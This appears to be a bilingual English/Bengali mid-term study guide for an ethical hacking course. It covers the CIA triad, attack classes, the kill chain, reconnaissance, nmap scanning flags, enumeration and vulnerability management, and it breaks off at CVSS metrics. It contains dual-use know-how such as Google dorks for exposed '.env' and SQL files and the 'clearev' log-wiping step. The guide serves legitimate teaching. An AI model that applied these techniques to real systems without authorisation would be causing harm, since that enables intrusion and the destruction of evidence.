# 📘 Ethical Hacking (ECH) — Mid-Term Exam Complete Preparation Guide

> **কোর্স:** Ethical Hacking (ECH) — 1st Semester  
> **সিলেবাস:** Before Mid (Modules 1 to 8 + Practical Labs & Assignments)  
> **ফরম্যাট:** পরীক্ষার জন্য সম্পূর্ণ উত্তর (English Definition + সহজ বাংলা ব্যাখ্যা + ডায়াগ্রাম + ল্যাব কমান্ড)

---

# 🛡️ Module 1: Introduction to Information Security & Hacking Basics

---

### ১. Element of Information Security ★★★
* **English Definition:** Information security elements are the foundational pillars designed to protect data and information systems from unauthorized access, use, disclosure, disruption, modification, or destruction.
* **The 5 Core Elements (Security Pentagon):**
  1. **Confidentiality:** Assures that information is accessible only to authorized users and protected from unauthorized disclosure (Defense: AES/RSA Encryption, ACLs, MFA).
  2. **Integrity:** Guarantees the trustworthiness, accuracy, and completeness of information by preventing unauthorized modification or tampering (Defense: Hashing algorithms like SHA-256, Digital Signatures, FIM).
  3. **Availability:** Ensures authorized users have uninterrupted and timely access to systems and data whenever needed (Defense: Redundancy, RAID, High Availability, Load Balancers, DDoS mitigation).
  4. **Authenticity:** Verifies that the identity of the user, device, or source of communication is genuine and verified (Defense: PKI, SSL/TLS Certificates, Biometrics).
  5. **Non-Repudiation:** Ensures that a sender or receiver cannot deny having performed a transaction or sent a message (Defense: Digital Signatures, Immutable Audit Logs, RFC 3161 Timestamping).

---

### ২. CIA Triangle (CIA Triad) ★★★
* **সংজ্ঞা:** তথ্যের নিরাপত্তার ক্লাসিক্যাল মডেল যা ৩টি মূল স্তম্ভের ওপর প্রতিষ্ঠিত।
```
              [ Confidentiality ]
                     /   \
                    /     \
                   /  CIA  \
                  /  Triad  \
    [ Availability ] ------- [ Integrity ]
```
* **১. Confidentiality (গোপনীয়তা):** সংবেদনশীল ডেটা কেবল অনুমতিপ্রাপ্ত ব্যক্তি দেখতে পারবে (যেমন: ক্রেডিট কার্ড নম্বর এনক্রিপ্ট রাখা)।
* **২. Integrity (নির্ভুলতা):** ডেটা ট্রানজিটে বা স্টোরেজে কেউ পরিবর্তন করেনি (যেমন: SHA-256 হ্যাশ ম্যাচ করা)।
* **৩. Availability (সহজলভ্যতা):** সিস্টেম ২৪/৭ চালু থাকবে (যেমন: ক্লাউড ব্যাকআপ, ফেইলওভার সার্ভার)।
* **পরীক্ষার জন্য গুরুত্বপূর্ণ পয়েন্ট:** Security, Usability এবং Functionality-এর ভারসাম্য বজায় রেখে CIA নিশ্চিত করতে হয়।

---

### ৩. Security Pentagon ★★★
* **সংজ্ঞা:** আধুনিক সাইবার নিরাপত্তা ও CEH ফ্রেমওয়ার্কে CIA ট্রায়াডের সাথে **Authenticity** এবং **Non-Repudiation** যুক্ত করে ৫টি কোণবিশিষ্ট যে মডেল তৈরি হয়, তাকে Security Pentagon বলা হয়।
```
                 [ Authenticity ]
                      /\
                     /  \
     [ Confidentiality ] [ Integrity ]
            \              /
             \            /
       [ Availability ]-[ Non-Repudiation ]
```
* **CIA vs Pentagon:** CIA ট্রায়াড কেবল ডেটার গোপনীয়তা, নির্ভুলতা ও প্রাপ্যতা নিশ্চিত করে; কিন্তু লেনদেনের উৎস আসল কি না (Authenticity) এবং কাজ শেষে তা অস্বীকার করা বন্ধ করা (Non-Repudiation) নিশ্চিত করতে Security Pentagon অপরিহার্য।

---

### ৪. Hacker Definition, Types of Hackers & Attack Components ★★
* **Hacker Definition:** যে ব্যক্তি কম্পিউটার সিস্টেম, নেটওয়ার্ক বা সফটওয়্যারের অভ্যন্তরীণ কার্যপ্রণালী গভীরভাবে জেনে সিস্টেমের দুর্বলতা (vulnerabilities) খুঁজে বের করে বা সিস্টেমে অননুমোদিত প্রবেশ লাভ করে।
* **Types of Hackers:**
  1. **White Hat Hackers:** নৈতিক হ্যাকার (Ethical Hackers) যারা অনুমোদিতভাবে (with permission) নিরাপত্তার ফাঁকফোকর খুঁজে ঠিক করতে কাজ করে।
  2. **Black Hat Hackers:** সাইবার অপরাধী যারা ব্যক্তিগত স্বার্থ বা আর্থিক লাভের জন্য অসদুপায়ে সিস্টেমে আক্রমণ করে ক্ষতিসাধন করে।
  3. **Grey Hat Hackers:** অনুমতি ছাড়া সিস্টেমে ঢোকে কিন্তু সাধারণত ক্ষতিকর উদ্দেশ্যে নয়; পরে বাউন্টি বা ফি দাবি করে দুর্বলতা প্রকাশ করে।
  4. **Suicide Hackers:** যারা ধরা পড়া বা জেল-জরিমানার ভয় না করেই প্রতিশোধ বা ধ্বংসযজ্ঞের জন্য হামলা চালায়।
  5. **Script Kiddies:** অভিজ্ঞতাহীন নবিশ যারা অন্যের লেখা রেডিমেড টুলস ও স্ক্রিপ্ট ব্যবহার করে কোনো গভীর জ্ঞান ছাড়াই আক্রমণ চালায়।
  6. **Hacktivists:** রাজনৈতিক, সামাজিক বা ধর্মীয় মতাদর্শ প্রচারের উদ্দেশ্যে ওয়েবসাইট ডিফেস বা ডেটা লিক করে (যেমন: Anonymous)।
  7. **State-Sponsored Hackers:** কোনো দেশের সরকার কর্তৃক পরিচালিত উচ্চ প্রশিক্ষিত দল যারা অন্য দেশের জাতীয় পরিকাঠামো বা গোপন তথ্যে হামলা করে।
* **Essential Components of an Attack:**
  $$\text{Attack} = \text{Motive (Goal)} + \text{Method (Tools/Techniques)} + \text{Vulnerability (Flaw)}$$
  * **Motive:** আক্রমণের উদ্দেশ্য (অর্থ, প্রতিশোধ, রাজনৈতিক ইত্যাদি)।
  * **Method:** আক্রমণ চালানোর পথ বা এক্সপ্লয়েট কৌশল।
  * **Vulnerability:** সিস্টেম বা সফটওয়্যারের নিরাপত্তার ত্রুটি বা দুর্বলতা।

---

### ৫. Classification of Attacks ★★★
CEH কারিকুলাম অনুসারে আক্রমণগুলোকে প্রধানত ৪টি শ্রেণীতে ভাগ করা হয়:
1. **Passive Attacks:** সিস্টেমের কোনো ক্ষতি না করে শুধুমাত্র গোপনে নেটওয়ার্ক ট্রাফিক বা তথ্য নজরদারি করা।
   * *উদাহরণ:* Sniffing, Eavesdropping, Footprinting, Wiretapping।
   * *শনাক্তকরণ:* অত্যন্ত কঠিন, কারণ সিস্টেমে কোনো পরিবর্তন আসে না।
2. **Active Attacks:** সিস্টেমে সরাসরি হস্তক্ষেপ করে ডেটা পরিবর্তন, সিস্টেম ডাউন বা এক্সেস দখল করা।
   * *উদাহরণ:* DoS/DDoS, SQL Injection, Session Hijacking, Man-in-the-Middle (MitM)।
3. **Close-in Attacks (Physical Attacks):** লক্ষ্যবস্তু বা ডিভাইসের শারীরিক নৈকট্যে গিয়ে আক্রমণ পরিচালনা করা।
   * *উদাহরণ:* Shoulder Surfing, Dumpster Diving, Rogue AP বা BadUSB প্লাগ করা।
4. **Insider Attacks:** প্রতিষ্ঠানের ভেতরকার কোনো অনুমোদিত কর্মী বা প্রিভিলেজড ইউজারের মাধ্যমে ক্ষতিসাধন বা ডেটা চুরি।
5. **Distribution Attacks:** সফটওয়্যার বা হার্ডওয়্যার ফ্যাক্টরি থেকে গ্রাহকের কাছে পৌঁছানোর পথে (Supply Chain) ম্যালওয়্যার যুক্ত করে দেওয়া।

---

### ৬. APT (Advanced Persistent Threat) ★★
* **সংজ্ঞা:** APT হলো অত্যন্ত সুসংগঠিত, দক্ষ এবং সুনির্দিষ্ট লক্ষ্যভিত্তিক (targeted) দীর্ঘমেয়াদী সাইবার আক্রমণ, যা সাধারণত রাষ্ট্রীয় পৃষ্ঠপোষকতায় (State-sponsored) বা বড় সাইবার অপরাধী চক্র দ্বারা পরিচালিত হয়।
* **মূল বৈশিষ্ট্য:**
  * **Advanced:** কাস্টম জিরো-ডে (0-day) এক্সপ্লয়েট এবং অত্যাধুনিক স্টেলথ টুলস ব্যবহার করে।
  * **Persistent:** লক্ষ্যবস্তুর নেটওয়ার্কে বছরের পর বছর গোপনে অবস্থান করে নজরদারি চালায়।
  * **Threat:** এদের আক্রমণ কোনো নির্দিষ্ট ব্যক্তিকে নয়, বরং জাতীয় নিরাপত্তা বা মেগা এন্টারপ্রাইজকে টার্গেট করে।
* **APT Lifecycle / Phases:**
  1. *Initial Compromise:* Spear phishing বা সাপ্লাই চেইন দ্বারা নেটওয়ার্কে ঢোকা।
  2. *Establish Foothold:* ব্যাকডোর ইনস্টল করা।
  3. *Escalate Privileges:* ডোমেন অ্যাডমিন অধিকার অর্জন।
  4. *Internal Reconnaissance:* অভ্যন্তরীণ নেটওয়ার্ক ম্যাপ করা।
  5. *Lateral Movement:* এক সার্ভার থেকে অন্য সার্ভারে বিস্তার।
  6. *Maintain Presence:* দীর্ঘমেয়াদী এক্সেস বজায় রাখা।
  7. *Data Exfiltration:* গোপন ডেটা নিরাপদে বাইরে পাচার করা।

---

# ⛓️ Module 2: Cyber Security Frameworks & Defense Strategies

---

### ১. Ethical Hacking Framework (The 6/7 Phases) ★★★★
পরীক্ষার জন্য এটি অন্যতম সর্বোচ্চ গুরুত্বপূর্ণ প্রশ্ন। হ্যাকিং ও পেনিট্রেশন টেস্টিংয়ের সার্বিক ফ্রেমওয়ার্ক নিচে দেওয়া হলো:
```
[ 1. Reconnaissance ] ➔ [ 2. Scanning ] ➔ [ 3. Enumeration ] ➔ [ 4. Vulnerability Analysis ]
                                                                           │
[ 7. Clearing Tracks ] 🠔 [ 6. Maintaining Access ] 🠔 [ 5. Gaining Access ] 🠔
```
1. **Reconnaissance (তথ্য সংগ্রহ):** টার্গেটের বিরুদ্ধে নিষ্ক্রিয় বা সক্রিয়ভাবে তথ্য যোগাড় করা (Passive/Active Recon)।
2. **Scanning (নেটওয়ার্ক স্ক্যানিং):** নেটওয়ার্কে কোন কোন হোস্ট চালু আছে, কোন কোন পোর্ট খোলা এবং কোন সার্ভিস চলছে তা বের করা (`nmap`, `netdiscover`)।
3. **Enumeration (এনিউমারেশন):** উন্মুক্ত পোর্ট ও সার্ভিস থেকে ইউজারনেম, শেয়ার ফোল্ডার, রাউটিং টেবিল ইত্যাদি সুনির্দিষ্ট তথ্য বের করা (`enum4linux`, `snmpwalk`)।
4. **Vulnerability Analysis (দুর্বলতা নিরূপণ):** চিহ্নিত সার্ভিসগুলোতে কোনো পরিচিত দুর্বলতা বা মিসকনফিগারেশন আছে কি না তা মূল্যায়ন করা (Nessus, OpenVAS, NVD)।
5. **Gaining Access (এক্সেস দখল):** দুর্বলতা কাজে লাগিয়ে (Exploitation) টার্গেট সিস্টেমে শেল বা এক্সেস নেওয়া (Metasploit, Reverse Shell)।
6. **Maintaining Access (এক্সেস টিকিয়ে রাখা):** রিবুট বা প্যাচিং হলেও যাতে প্রবেশাধিকার বজায় থাকে সেজন্য ব্যাকডোর, ট্রোজান বা রুটকিট স্থাপন করা।
7. **Clearing Tracks (চিহ্ন মুছে ফেলা):** আক্রমণের কোনো প্রমাণ না রাখতে সিস্টেম লগ মুছে ফেলা (`clearev`), অডিট লগ বন্ধ করা বা টাইমস্ট্যাম্প পরিবর্তন করা।

---

### ২. Cyber Kill Chain Method ★★★
* **উৎস:** লকহিড মার্টিন (Lockheed Martin) কর্তৃক উদ্ভাবিত একটি মডেল যা কোনো সাইবার হামলার প্রতিটি ধাপ চিহ্নিত ও প্রতিহত করতে ব্যবহৃত হয়।
* **ধাপ ৭টি (ক্রমানুসারে মুখস্থ রাখতে হবে):**
  1. **Reconnaissance:** টার্গেটের দুর্বলতা ও তথ্য সংগ্রহ (LinkedIn, DNS, পোর্ট স্ক্যান)।
  2. **Weaponization:** কোনো এক্সপ্লয়েটকে পেলোডের (যেমন: ম্যালিসিয়াস PDF বা Macro Excel) সাথে যুক্ত করে অস্ত্র তৈরি করা।
  3. **Delivery:** ইমেইল ফিশিং বা ওয়েবসাইটের মাধ্যমে টার্গেটের কাছে পেলোড পাঠানো।
  4. **Exploitation:** শিকার পেলোড রান করা মাত্রই সফটওয়্যার দুর্বলতাকে কাজে লাগিয়ে কোড এক্সিকিউট করা।
  5. **Installation:** সিস্টেমে ম্যালওয়্যার বা ব্যাকডোর স্থায়ীভাবে ইনস্টল হওয়া।
  6. **Command and Control (C2):** আক্রান্ত সিস্টেম বহিরাগত হ্যাকারের C2 সার্ভারের সাথে এনক্রিপ্টেড সংযোগ স্থাপন করা।
  7. **Actions on Objectives:** চূড়ান্ত লক্ষ্য পূরণ (যেমন: ডেটা চুরি, সিস্টেম র‍্যানসমওয়্যারে এনক্রিপ্ট করা, ধ্বংসযজ্ঞ)।

---

### ৩. Cyber Threat Intelligence (CTI): Definition + Life Cycle ★★★
* **CTI Definition:** সাইবার আক্রমণকারীদের পরিচয়, উদ্দেশ্য, সক্ষমতা এবং আক্রমণের ধরণ (TTPs) সম্পর্কিত প্রমাণ-ভিত্তিক জ্ঞান ও তথ্য যা সম্ভাব্য ঝুঁকি কমাতে সাহায্য করে।
* **CTI Life Cycle (৬টি ধাপ):**
  1. **Planning & Direction:** কোন কোন হুমকির তথ্য সংগ্রহ করতে হবে তার লক্ষ্য ও প্রশ্নের পরিধি নির্ধারণ।
  2. **Collection:** বিভিন্ন সোর্স (OSINT, ডার্ক ওয়েব ফোরাম, সিকিউরিটি লগ, সিগনাল ইন্টেলিজেন্স) থেকে ডেটা যোগাড় করা।
  3. **Processing:** অসংগঠিত কাঁচা ডেটাকে সাজানো, ফিল্টার করা এবং ডিক্রিপ্ট করা।
  4. **Analysis:** ডেটা বিশ্লেষণ করে বাস্তবায়নযোগ্য ইন্টেলিজেন্সে রূপান্তর করা।
  5. **Dissemination:** তৈরি রিপোর্ট সংশ্লিষ্ট দল বা ডিসিশন মেকারদের কাছে পাঠানো।
  6. **Feedback:** প্রাপ্ত ফলের ভিত্তিতে পরবর্তী চক্রের উন্নয়ন করা।

---

### ৪. Defense in Depth (Definition & Layers with Diagram) ★★★
* **সংজ্ঞা:** কোনো একক নিরাপত্তার ওপর নির্ভর না করে একাধিক স্তরে নিরাপত্তা ব্যবস্থা (Layered Security) স্থাপন করা, যাতে একটি স্তর ভেদ হলেও পরবর্তী স্তর আক্রমণকে আটকে দিতে পারে।
* **৭টি লেয়ার বিশিষ্ট চিত্র:**
```
+-------------------------------------------------------------+
| 1. Policies, Procedures & Awareness (নীতিমালা ও কর্মী সচেতনতা)|
| +---------------------------------------------------------+ |
| | 2. Physical Security (গার্ড, সিসিটিভি, বায়োমেট্রিক তালা) | |
| | +-----------------------------------------------------+ | |
| | | 3. Perimeter Security (ফায়ারওয়াল, VPN, WAF, IPS)   | | |
| | | +-------------------------------------------------+ | | |
| | | | 4. Internal Network (VLAN, NAC, নেটওয়ার্ক সেগমেন্ট)| | |
| | | | +---------------------------------------------+ | | | |
| | | | | 5. Host Security (OS হার্ডেনিং, EDR, অ্যান্টিভাইরাস) | | | |
| | | | | +-----------------------------------------+ | | | | |
| | | | | | 6. Application Security (WAF, সোর্স কোড অডিট)| | | | |
| | | | | | +-------------------------------------+ | | | | | |
| | | | | | | 7. DATA (এনক্রিপশন, ব্যাকআপ, DLP)    | | | | | |
| | | | | | +-------------------------------------+ | | | | | |
| | | | | +-----------------------------------------+ | | | | |
| | | | +---------------------------------------------+ | | | |
| | | +-------------------------------------------------+ | | |
| | +-----------------------------------------------------+ | |
| +---------------------------------------------------------+ |
+-------------------------------------------------------------+
```

---

### ৫. Risk Management & Firewall Risk Mitigation ★★★
* **Risk Formula:** 
  $$\text{Risk} = \text{Threat (হুমকি)} \times \text{Vulnerability (দুর্বলতা)} \times \text{Impact (প্রভাব)}$$
* **Firewall Risk Mitigation (ফায়ারওয়ালের ঝুঁকি কমানোর কৌশল):**
  * **Default Deny Rule:** যা কিছু বিশেষভাবে অনুমোদিত নয়, সবকিছু ব্লক করা (`Deny All by default`)।
  * **Ingress ও Egress ফিল্টারিং:** ইনকামিং ট্রাফিকের পাশাপাশি আক্রান্ত হোস্ট বাইরে যোগাযোগ করছে কি না তা দেখতে আউটগোয়িং ট্রাফিক কঠোরভাবে নিয়ন্ত্রণ।
  * **Stateful Inspection:** কেবল পোর্ট নয়, সেশনের বৈধ হ্যান্ডশেক স্টেট মনিটর করা।
  * **নিয়মিত রুল অডিট:** অপ্রয়োজনীয় ও পুরোনো ওপেন পোর্ট বা রুল অপসারণ করা।

---

# 🔍 Module 3: Footprinting & Reconnaissance (Information Gathering)

---

### ১. What is Footprinting & Types of Reconnaissance? ★★★
* **Footprinting:** টার্গেট প্রতিষ্ঠান বা সিস্টেমের নেটওয়ার্ক রেঞ্জ, ডোমেন নাম, সার্ভার টেকনোলজি, কর্মী তালিকা ইত্যাদি প্রাথমিক তথ্য নিয়মমাফিকভাবে যোগাড় করার প্রক্রিয়া।
* **Types of Reconnaissance:**
  1. **Passive Reconnaissance:** টার্গেট সিস্টেমের সাথে সরাসরি কোনো যোগাযোগ না করে পাবলিকলি উপলব্ধ উৎস থেকে তথ্য সংগ্রহ করা। টার্গেট কখনো বুঝতে পারে না যে তথ্য নেওয়া হচ্ছে।
     * *টুলস:* Google Dorking, Whois, Netcraft, LinkedIn, Shodan, Wayback Machine।
  2. **Active Reconnaissance:** সরাসরি টার্গেট সার্ভার বা আইপিতে প্যাকেট বা প্রোব পাঠিয়ে তথ্য নেওয়া। এতে টার্গেটের IDS/IPS বা ফায়ারওয়ালে লগ তৈরি হয়।
     * *টুলস:* `nmap`, `ping`, `nslookup`, `telnet`, `nikto`।

---

### ২. Google Dorking (Google Hacking Database - GHDB)
* **Google Dorking:** গুগলের অ্যাডভান্সড সার্চ অপারেটর ব্যবহার করে ইন্টারনেটে উন্মুক্ত কনফিগারেশন ফাইল, পাসওয়ার্ড লগ, ক্যামেরা বা দুর্বল সার্ভার খুঁজে বের করা।
* **মূল অপারেটরসমূহ:**
  * `site:` — নির্দিষ্ট ডোমেনে সীমাবদ্ধ রাখা (যেমন: `site:hackersacademy.com`)
  * `filetype:` — ফাইলের এক্সটেনশন খোঁজা (যেমন: `filetype:pdf`, `filetype:env`, `filetype:sql`)
  * `inurl:` — URL-এর ভেতরে নির্দিষ্ট শব্দ খোঁজা (যেমন: `inurl:admin.php`, `inurl:login`)
  * `intitle:` — ওয়েব পেজের টাইটেলে খোঁজা (যেমন: `intitle:"index of /"`)
* **GHDB:** Offensive Security পরিচালিত একটি উন্মুক্ত রিপোজিটরি যেখানে হাজার হাজার কার্যকরী গুগল ডর্ক সংরক্ষিত থাকে।

---

### ৩. Competitive Intelligence Gathering
* **সংজ্ঞা:** কোনো প্রতিদ্বন্দ্বী কোম্পানি বা প্রতিষ্ঠানের ব্যবসায়িক পরিকল্পনা, ব্যবহৃত প্রযুক্তি স্ট্যাক, পার্টনারশিপ ও কর্মীবাহিনীর তথ্য নীতিগতভাবে পাবলিক সোর্স থেকে বিশ্লেষণ করা।
* **উৎস:** কোম্পানির জব পোস্টিং (যেখানে চাকরির বর্ণনায় কোন সার্ভার বা ফায়ারওয়াল ব্যবহার করে তা লেখা থাকে), SEC/EDGAR ফাইলিং, পেটেন্ট ডেটাবেস, সোশ্যাল মিডিয়া।

---

# 🌐 Module 4: Network & Protocols Foundation

---

### ১. OSI Reference Model ★★
আন্তর্জাতিক সংস্থা ISO কর্তৃক প্রণীত ৭টি স্তরের নেটওয়ার্ক মডেল:
| লেয়ার নম্বর | লেয়ারের নাম | PDU (Data Unit) | মূল প্রোটোকল ও নিরাপত্তা ব্যবস্থা |
|---|---|---|---|
| **Layer 7** | Application | Data | HTTP, HTTPS, FTP, DNS, SMTP, WAF |
| **Layer 6** | Presentation | Data | SSL/TLS, JPEG, ASCII (এনক্রিপশন ও কম্প্রেশন) |
| **Layer 5** | Session | Data | NetBIOS, RPC, PPTP (সেশন ম্যানেজমেন্ট) |
| **Layer 4** | Transport | Segment | TCP, UDP (SSL/TLS, পোর্ট সিকিউরিটি) |
| **Layer 3** | Network | Packet | IP, ICMP, IPsec, Router, ফায়ারওয়াল |
| **Layer 2** | Data Link | Frame | Ethernet, MAC, Switch, ARP Inspection |
| **Layer 1** | Physical | Bits | হাব, ক্যাবল, ফিজিক্যাল ওয়্যারিং, সিগন্যাল |

---

### ২. TCP Flags Explained ★★★
TCP হেডার-এ ৬টি মূল ফ্ল্যাগ থাকে (Control Bits) যা প্যাকেট ট্রান্সমিশনের অবস্থা নির্দেশ করে:
1. **SYN (Synchronize):** সংযোগ স্থাপনের সূচনা করতে হ্যান্ডশেক শুরুর প্রথম প্যাকেট।
2. **ACK (Acknowledgment):** কোনো প্যাকেট সফলভাবে গ্রহণের প্রাপ্তিস্বীকার বা কনফার্মেশন।
3. **FIN (Finish):** স্বাভাবিক ও নিয়মমাফিক উপায়ে সংযোগ বন্ধের প্রস্তাব।
4. **RST (Reset):** কোনো অবৈধ প্যাকেট এলে বা জোরপূর্বক তাৎক্ষণিক সংযোগ কেটে দিতে ব্যবহৃত হয় (পোর্ট বন্ধ থাকলে ক্লোজড পোর্ট RST পাঠায়)।
5. **PSH (Push):** বাফারে অপেক্ষা না করে ডেটা অবিলম্বে অ্যাপ্লিকেশন লেয়ারে পাঠিয়ে দেওয়ার নির্দেশ।
6. **URG (Urgent):** প্যাকেটের নির্দিষ্ট ডেটা অত্যন্ত জরুরি ভিত্তিতে প্রসেস করার নির্দেশ।

---

### ৩. TCP 3-Way Handshake ★★★★
পরীক্ষার অন্যতম প্রিয় প্রশ্ন। নির্ভরযোগ্য TCP সংযোগ স্থাপনের ৩টি ধাপ:
```
Client (অ্যাটাকার/ইউজার)                       Server (টার্গেট)
       |                                              |
       |  ---- Step 1: [SYN, Seq = x] ------------->  | (ক্লায়েন্ট কানেকশন রিকোয়েস্ট পাঠায়)
       |                                              |
       |  <--- Step 2: [SYN+ACK, Seq = y, Ack = x+1]  | (সার্ভার গ্রহণ করে এবং নিজের SYN পাঠায়)
       |                                              |
       |  ---- Step 3: [ACK, Seq = x+1, Ack = y+1] -> | (ক্লায়েন্ট কনফার্ম করে, সংযোগ সম্পন্ন)
       v                                              v
```
* **Half-Open Attack (SYN Flood):** ক্লায়েন্ট Step 1 এ SYN পাঠায়, সার্ভার Step 2 এ SYN-ACK দিয়ে বাফার রিজার্ভ করে অপেক্ষা করে; কিন্তু ক্লায়েন্ট কখনো Step 3 এর চূড়ান্ত ACK পাঠায় না। ফলে সার্ভারের মেমোরি পূর্ণ হয়ে সার্ভার ক্র্যাশ করে (DoS attack)।

---

# 📡 Module 5: Scanning & Host Discovery

---

### ১. What is Scanning & Types of Scanning ★★★
* **Scanning:** রিকনেসান্সের পরবর্তী ধাপ, যেখানে নেটওয়ার্কে সক্রিয় হোস্ট, ওপেন পোর্ট এবং তাদের সার্ভিস ভার্সন সক্রিয়ভাবে শনাক্ত করা হয়।
* **স্ক্যানিংয়ের ৩টি প্রকারভেদ:**
  1. **Network Scanning:** সাবনেটের মধ্যে কোন কোন আইপি বা হোস্ট চালু আছে তা বের করা (Ping Sweep)।
  2. **Port Scanning:** কোনো টার্গেট আইপির কোন কোন TCP/UDP পোর্ট খোলা আছে তা জানা।
  3. **Vulnerability Scanning:** ওপেন পোর্টের সার্ভিসে কোনো পরিচিত ত্রুটি বা CVE আছে কি না তা অটোমেটেড স্ক্যানারের মাধ্যমে যাচাই করা।

---

### ২. Network Scanning Objectives ★★★
1. সক্রিয় হোস্ট শনাক্ত করা (Discover live hosts on network)।
2. উন্মুক্ত পোর্ট খুঁজে বের করা (Identify open, closed, or filtered ports)।
3. অপারেটিং সিস্টেম ও এর ভার্সন শনাক্ত করা (OS fingerprinting)।
4. চলমান সার্ভিস ও সফটওয়্যার ভার্সন জানা (Service and Version detection)।
5. সিস্টেমের দুর্বলতা ও মিসকনফিগারেশন চিহ্নিত করা।

---

### ৩. Host Discovery Techniques
* **ARP Ping (`-PR`):** লোকাল নেটওয়ার্কে সবচেয়ে দ্রুত ও নির্ভুল (ফায়ারওয়াল ব্লক করতে পারে না)।
* **ICMP Echo Ping (`-PE`):** সাধারণ পিং প্যাকেট পাঠানো (অনেক ফায়ারওয়ালে ব্লক থাকে)।
* **TCP SYN Ping (`-PS`):** পোর্ট ৮০ বা ৪৪৩ এ SYN পাঠিয়ে হোস্টের উপস্থিতি নিশ্চিত করা।
* **UDP Ping (`-PU`):** বন্ধ পোর্টে UDP পাঠিয়ে ICMP Port Unreachable উত্তরের মাধ্যমে হোস্ট শনাক্ত করা।
* **No Ping (`-Pn`):** পিং পরীক্ষা বাদ দিয়ে সরাসরি প্রতিটি হোস্টকে জীবন্ত ধরে স্ক্যান করা।

---

### ৪. Port and Service Discovery Techniques (Nmap Flags)
* **TCP Connect Scan (`-sT`):** পূর্ণ ৩-ওয়ে হ্যান্ডশেক সম্পন্ন করে। নির্ভুল কিন্তু টার্গেট লগে ধরা পড়ে যায়।
* **SYN Stealth Scan (`-sS`):** ডিফল্ট ও সবচেয়ে জনপ্রিয়। কেবল SYN পাঠায়, SYN-ACK পেলে তাৎক্ষণিক RST পাঠিয়ে হ্যান্ডশেক ভেঙে ফেলে; সংযোগ পূর্ণ হয় না বলে লগে রেকর্ড হয় না।
* **UDP Scan (`-sU`):** UDP পোর্ট (DNS 53, SNMP 161) স্ক্যান করার জন্য। ধীরগতির।
* **Version Detection (`-sV`):** পোর্টে চলা সার্ভিসের সফটওয়্যার ভার্সন (যেমন: Apache 2.4.49) প্রকাশ করে।
* **OS Detection (`-O`):** TCP/IP স্ট্যাক ফিঙ্গারপ্রিন্টিংয়ের মাধ্যমে অপারেটিং সিস্টেম চিনে নেয়।

---

# 🔢 Module 6: Enumeration & Banner Grabbing

---

### ১. What is Enumeration and its Activities? ★
* **Enumeration:** স্ক্যানিংয়ে প্রাপ্ত ওপেন সার্ভিসগুলোর সাথে সরাসরি সক্রিয় সংযোগ তৈরি করে সুনির্দিষ্ট তথ্য (যেমন: ইউজার একাউন্ট, শেয়ার ফোল্ডার, রাউটিং টেবিল) সংগ্রহের প্রক্রিয়া।
* **Enumeration Activities:**
  * নেটওয়ার্ক শেয়ার ও ফোল্ডারের নাম জানা (SMB shares)।
  * ব্যবহারকারী ও গ্রুপের তালিকা তৈরি (User/Group names)।
  * রাউটিং টেবিল ও মেশিন নাম বের করা।
  * DNS জোন ট্রান্সফার (AXFR) টেস্ট করা।
  * SNMP কমিউনিটি স্ট্রিং বের করে পুরো নেটওয়ার্ক তথ্য ডাউনলোড করা।

---

### ২. The Purpose of Enumeration ★★
* স্ক্যানিং শুধু জানায় পোর্ট খোলা আছে কি না; আর এনিউমারেশন জানায় ভেতরে ঠিক কী চলছে এবং কার কার ইউজার আইডি আছে।
* এটি স্ক্যানিং এবং সরাসরি সিস্টেমে অননুমোদিত প্রবেশের (Gaining Access / Exploitation) মধ্যকার সেতুবন্ধন।

---

### ৩. OS Discovery and Banner Grabbing
* **Banner Grabbing:** কোনো পোর্টের সার্ভিসে রিমোটলি কানেক্ট করে অ্যাপ্লিকেশন বা অপারেটিং সিস্টেমের যে ওয়েলকাম মেসেজ বা হেডার ফিরে আসে তা দেখে সার্ভিস ও ওএস ভার্সন জানা।
* **ধরন:**
  * **Active Banner Grabbing:** `telnet`, `netcat` বা `curl -I` দিয়ে সরাসরি রিকোয়েস্ট পাঠিয়ে ব্যানার সংগ্রহ করা।
  * **Passive Banner Grabbing:** Wireshark দিয়ে ক্যাপচার করা প্যাকেটের TTL (Time to Live) এবং TCP Window Size পরীক্ষা করে ওএস অনুমান করা (যেমন: লিনাক্সের TTL সাধারণত ৬৪, উইন্ডোজের ১২৮)।

---

# ⚠️ Module 7: Vulnerability Assessment & Management

---

### ১. Steps of Vulnerability Management Life Cycle ★★★★
পরীক্ষার অন্যতম ৪-স্টার প্রশ্ন। সাইকেলটির ৬টি ধাপ ধারাবাহিকভাবে মনে রাখতে হবে:
```
[ 1. Discover ] ➔ [ 2. Prioritize Assets ] ➔ [ 3. Assess ]
       🠕                                            │
[ 6. Report & Audit ] 🠔 [ 5. Verify / Rescan ] 🠔 [ 4. Remediate ]
```
1. **Discover (আবিষ্কার):** নেটওয়ার্কে থাকা সমস্ত আইটি সম্পদ (সার্ভার, পিসি, রাউটার) ইনভেন্টরিতে তালিকাভুক্ত করা।
2. **Prioritize Assets (অগ্রাধিকার নির্ধারণ):** ব্যবসার জন্য কোন এসেটটি সবচেয়ে বেশি গুরুত্বপূর্ণ (যেমন: ডেটাবেস সার্ভার বনাম টেস্ট মেশিন) তা বিন্যাস করা।
3. **Assess (মূল্যায়ন):** অটোমেটেড ভালনারেবিলিটি স্ক্যানার দিয়ে ত্রুটি ও ঝুঁকির মাত্রা পরিমাপ করা।
4. **Remediate (সমাধান):** ত্রুটি দূর করতে সিকিউরিটি প্যাচ প্রয়োগ করা, কনফিগারেশন ঠিক করা বা অপ্রয়োজনীয় সার্ভিস বন্ধ করা।
5. **Verify (যাচাইকরণ):** পুনরায় স্ক্যান (Rescan) চালিয়ে নিশ্চিত হওয়া যে প্যাচটি সঠিকভাবে কাজ করেছে এবং ত্রুটি দূর হয়েছে।
6. **Report (প্রতিবেদন তৈরি):** ম্যানেজমেন্ট এবং টেকনিক্যাল টিমের জন্য বিস্তারিত ঝুঁকি ও সমাধানের অডিট রিপোর্ট প্রকাশ করা।

---

### ২. CVSS Scoring System (Common Vulnerability Scoring System)
* **CVSS:** যেকোনো সিকিউরিটি দুর্বলতার তীব্রতা (Severity) পরিমাপ করার বিশ্বজনীন আন্তর্জাতিক স্ট্যান্ডার্ড (ভার্সন: CVSS v3.1 ও v4.0, নিয়ন্ত্রণ করে FIRST.org)।
* **স্কোর রেঞ্জ ও সিভিয়ারিটি রেটিং:**
  * `0.0` : None
  * `0.1 – 3.9` : Low
  * `4.0 – 6.9` : Medium
  * `7.0 – 8.9` : **High**
  * `9.0 – 10.0` : **Critical**
* **CVSS এর ৩টি মেট্রিক গ্রুপ:**
